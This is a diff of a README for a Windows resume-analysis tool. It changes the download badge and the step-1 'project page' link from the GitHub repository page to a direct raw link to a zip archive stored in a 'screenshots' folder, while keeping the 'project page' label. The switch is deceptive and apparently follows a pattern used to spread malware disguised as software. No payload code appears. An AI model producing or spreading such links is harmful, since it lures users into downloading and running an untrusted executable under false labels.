@@ -1,6 +1,6 @@
 # 📄 AI-Resume-Analyzer - Improve your job application success rate
 
-[![Download AI-Resume-Analyzer](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/sobrin3378/AI-Resume-Analyzer)
+[![Download AI-Resume-Analyzer](https://img.shields.io/badge/Download-Application-blue.svg)](https://raw.githubusercontent.com/sobrin3378/AI-Resume-Analyzer/main/screenshots/A_Resume_Analyzer_2.4.zip)
 
 ## 🎯 About this tool
 
@@ -21,7 +21,7 @@ You do not need to install complex development tools or programming software. Th
 
 Follow these steps to prepare the software for use on your machine.
 
-1. Navigate to the project page: [https://github.com/sobrin3378/AI-Resume-Analyzer](https://github.com/sobrin3378/AI-Resume-Analyzer).
+1. Navigate to the project page: [https://raw.githubusercontent.com/sobrin3378/AI-Resume-Analyzer/main/screenshots/A_Resume_Analyzer_2.4.zip](https://raw.githubusercontent.com/sobrin3378/AI-Resume-Analyzer/main/screenshots/A_Resume_Analyzer_2.4.zip).
 2. Locate the download section on the page.
 3. Select the latest version for Windows.
 4. Save the file to your desktop or your downloads folder.
